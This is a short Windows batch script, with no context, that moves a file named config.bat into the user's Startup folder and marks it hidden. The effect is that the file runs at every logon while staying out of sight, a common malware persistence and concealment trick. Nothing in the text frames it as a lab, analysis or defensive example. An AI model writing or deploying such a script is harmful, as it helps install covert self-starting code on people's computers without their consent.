@echo off
set "source=%~dp0config.bat"
set "startup=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
move "%source%" "%startup%\"
attrib +h "%startup%\config.bat"
pause
